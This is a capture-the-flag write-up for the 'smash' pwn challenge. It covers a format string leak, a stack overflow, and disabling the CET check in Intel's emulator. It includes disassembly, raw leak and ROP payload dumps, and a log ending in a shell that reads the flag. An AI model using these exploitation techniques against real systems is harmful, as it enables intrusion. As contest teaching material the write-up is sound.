# smash (pwn 388p, 9 solved)

TL;DR

1. Leak locations of libc and stack by exploiting the format string vulnerability
2. Modify the CET configuration of the emulator by using the write primitive from the stack buffer overflow
3. Execute shell with ROP sequence from the stack buffer overflow

## Analysis

In the task we get:
* [64-bit Linux executable](smash) of the server application,
* libc shared library,
* "Software Development Emulator" from Intel that reports version "8.56.0 external" and
* the following loader script:
```
#!/bin/sh

cd `dirname $0`
echo "Now loading..."
env -i ./sde/sde64 -no-follow-child -cet -cet_output_file /dev/null -- ./smash
```

The server application includes two vulnerabilities that are easy to spot.

The first vulnerability is that unsanitized user input is passed as the format parameter when calling `__dprintf_chk` at 0x126B:
```
.text:122C                 lea     rsi, aInputName ; "Input name > "
.text:1233                 mov     edi, 1
.text:1238                 mov     eax, 0
.text:123D                 call    dprintf@plt
.text:1242                 mov     esi, 20h        ; read_size
.text:1247                 mov     edi, 0          ; buffer
.text:124C                 call    sub_12E7        ; read string
.text:1251                 mov     [rbp+user_input], rax
.text:1255                 mov     rax, [rbp+user_input]
.text:1259                 mov     rdx, rax        ; format
.text:125C                 mov     esi, 1
.text:1261                 mov     edi, 1
.text:1266                 mov     eax, 0
.text:126B                 call    __dprintf_chk@plt
```
An attacker could exploit this format string vulnerability to leak content of the application stack.

The second vulnerability is that subroutine `sub_12E7` allocates stack buffer of insufficient size when called at 0x1290 and 0x12C9:
```
.text:1286                 mov     esi, 38h        ; read_size
.text:128B                 mov     edi, 0          ; buffer
.text:1290                 call    sub_12E7        ; read string
.text:1295                 mov     [rbp+user_input], rax
.text:1299                 mov     rax, [rbp+user_input]
.text:129D                 movzx   eax, byte ptr [rax]
.text:12A0                 or      eax, 20h
.text:12A3                 cmp     al, 'y'
.text:12A5                 jnz     short l_message_done
.text:12A7                 lea     rsi, aInputMessage ; "\nInput message > "
.text:12AE                 mov     edi, 1
.text:12B3                 mov     eax, 0
.text:12B8                 call    dprintf@plt
.text:12BD                 mov     rax, [rbp+user_input]
.text:12C1                 mov     esi, 38h        ; read_size
.text:12C6                 mov     rdi, rax        ; buffer
.text:12C9                 call    sub_12E7        ; read string
.text:12CE l_message_done:
```
An attacker could exploit this stack buffer overflow vulnerability to overwrite the saved `rbp` and the return address.

However any attempts to change the return address via the stack buffer overflow vulnerability are unsuccessful.
This is because of the CET mitigation that protects integrity of the return addresses.
The protection is implemented as Intel processor feature using a dedicated shadow stack to record just the return addresses.
When executing "call" instruction, the processor pushes the return address on both the normal application stack and the shadow stack.
On "ret" instruction, values from both stacks are compared to detect any unexpected changes.

The challenge uses software to emulate CET feature, so we decided to check the internals of the emulator.
In particular we focused on checking how "Software Development Emulator" tracks the CET state in memory.
When reverse engineering, we started with the strings used for printing CET configuration and quickly identified the relevant data structure.
We learned that changing a few bits would be sufficient to disable CET in the emulator.

We also checked that even if the relevant data structure is located in the emulator heap, its offset from libc remains constant across runs.

## Exploitation

Our [exploit](exploit.py) works as follows.

### Step 1: Leak locations of libc and stack by exploiting the format string vulnerability

This is required for the two steps that follow.

### Step 2: Modify the CET configuration of the emulator by using the write primitive from the stack buffer overflow

In order to disable CET in the emulator we need to reset relevant field of CET configuration block.
The targeted data structure is located at fixed distance from libc.

We use a primitive to write zero bit at arbitrary address to perform this action.
For this we exploit the stack buffer overflow vulnerability in subroutine `sub_12E7` called at 0x1290, overwriting the saved `rbp` value before it is used later as the frame pointer at 0x1295.
This overwrites arbitrary memory location with an address of heap buffer.
Using the least significant bits of the heap pointer is sufficient as these are always zero.

### Step 3: Execute shell with ROP sequence from the stack buffer overflow

CET is disabled at this point and we are free to use any gadget to construct ROP chain here.

## Example

```
[+] Opening connection to pwn01.chal.ctf.westerns.tokyo on port 29246: Done
[DEBUG] Received 0xf bytes:
    b'Now loading...\n'
[*] Step 1: Leak locations of libc and stack by exploiting the format string vulnerability...
[DEBUG] Received 0xd bytes:
    b'Input name > '
[DEBUG] Sent 0x1b bytes:
    b'%p\t%p\t%p\t%p\t%p\t%p\t%p\t%p\t%p\t'
[DEBUG] Received 0x6a bytes:
    b'0x55f82a80f2c0\t0x55f82a80f2a0\t0xd\t(nil)\t0x55f82a80f2a0\t0x7ffd22f0b010\t0x55f829915216\t(nil)\t0x7fc48f3c50b3\t'
[DEBUG] Received 0xb bytes:
    b'\n'
    b'OK? [y/n] '
[*] stack_va = 7ffd22f0b010
[*] libc_start_main_va = 7fc48f3c50b3
[*] libc_va = 7fc48f39e000
[*] Step 2: Modify the CET configuration of the emulator by using the write primitive from the stack buffer overflow...
[*] target_va = 7fc5a3e14f90
[DEBUG] Sent 0x37 bytes:
    00000000  79 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │yAAA│AAAA│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000030  98 4f e1 a3  c5 7f 00                               │·O··│···│
    00000037
[*] Step 3: Execute shell with ROP sequence from the stack buffer overflow...
[DEBUG] Received 0x11 bytes:
    b'\n'
    b'Input message > '
[DEBUG] Sent 0x37 bytes:
    00000000  e0 fe 4d 8f  c4 7f 00 00  e1 fe 4d 8f  c4 7f 00 00  │··M·│····│··M·│····│
    00000010  e6 4c 48 8f  c4 7f 00 00  42 42 42 42  42 42 42 42  │·LH·│····│BBBB│BBBB│
    00000020  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
    00000030  a8 af f0 22  fd 7f 00                               │···"│···│
    00000037
[DEBUG] Received 0x6 bytes:
    b'\n'
    b'Bye!\n'
[*] Switching to interactive mode
$ ls -la
total 8656
drwxr-x---  3 root smash    4096 Sep 20 03:46 .
drwxr-xr-x 11 root root     4096 Sep 21 10:04 ..
-rw-r-----  1 root smash      43 Sep 20 03:42 flag.txt
-rwxr-x---  1 root smash     128 Sep 20 03:42 run.sh
drwxr-xr-x  4 root smash    4096 Sep 12 14:44 sde
-rw-r-----  1 root smash 8826053 Sep 20 03:42 sde.tgz
-rwxr-x---  1 root smash   14464 Sep 20 03:42 smash
$ cat flag.txt
TWCTF{17_15_ju57_4n_3mul470r,n07_r34l_CET}
```
